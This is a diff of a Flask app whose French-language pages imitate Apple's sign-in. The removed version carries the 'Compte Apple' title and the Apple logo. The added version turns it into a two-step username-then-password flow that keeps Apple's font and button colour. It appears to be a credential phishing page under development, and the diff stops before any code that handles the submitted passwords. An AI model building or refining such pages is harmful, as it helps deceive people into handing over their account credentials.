@@ -1,73 +1,111 @@
 from flask import Flask, request, render_template_string
+
 app = Flask(__name__)
-login_form = """
+
+step1_form = """
 <!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Compte Apple</title>
+    <title>Connexion - Étape 1</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-            background-color: white;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            zoom: 1.3; /* Ajout du zoom global */
+            background-color: #fff;
         }
-        .login-container {
+        .container {
+            width: 90%;
             max-width: 400px;
-            width: 95%;
-            text-align: center;
         }
-        .logo {
-            width: 150px; /* Agrandi */
-            margin-bottom: 40px;
-        }
-        h2 {
-            font-weight: 600;
-            font-size: 32px; /* Agrandi */
-            margin: 0;
-        }
-        p {
-            font-size: 20px; /* Agrandi */
-            color: #666;
-            margin-top: 10px;
-            margin-bottom: 35px;
-        }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 20px; /* Agrandi */
-            font-size: 20px; /* Agrandi */
-            margin-bottom: 25px;
-            border-radius: 12px;
+        .input-box {
+            display: flex;
             border: 1px solid #ccc;
+            border-radius: 24px;
+            overflow: hidden;
+        }
+        input[type="text"] {
+            flex: 1;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            outline: none;
         }
         button {
-            width: 100%;
-            padding: 20px; /* Agrandi */
-            font-size: 24px; /* Agrandi */
-            background-color: #0071e3;
-            color: white;
+            background-color: transparent;
             border: none;
-            border-radius: 12px;
+            padding: 0 20px;
             cursor: pointer;
-        }
-        button:hover {
-            background-color: #005bb5;
+            font-size: 18px;
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
-        <h2>Compte Apple</h2>
-        <p>Gérer le compte Apple</p>
+    <div class="container">
         <form method="POST">
-            <input type="text" name="username" placeholder="E-mail ou numéro de téléphone" required><br>
+            <div class="input-box">
+                <input type="text" name="username" placeholder="Courriel ou numéro de téléphone" required>
+                <button type="submit">→</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
+"""
+
+step2_form = """
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Connexion - Étape 2</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fff;
+        }
+        .container {
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        h3 {
+            margin-bottom: 20px;
+        }
+        input[type="password"] {
+            width: 100%;
+            padding: 16px;
+            font-size: 16px;
+            border-radius: 8px;
+            border: 1px solid #ccc;
+            margin-bottom: 20px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            font-size: 16px;
+            background-color: #0071e3;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h3>{{ username }}</h3>
+        <form method="POST">
+            <input type="hidden" name="username" value="{{ username }}">
             <input type="password" name="password" placeholder="Mot de passe" required><br>
-            <button type="submit">→</button>
+            <button type="submit">Se connecter</button>
         </form>
     </div>
 </body>
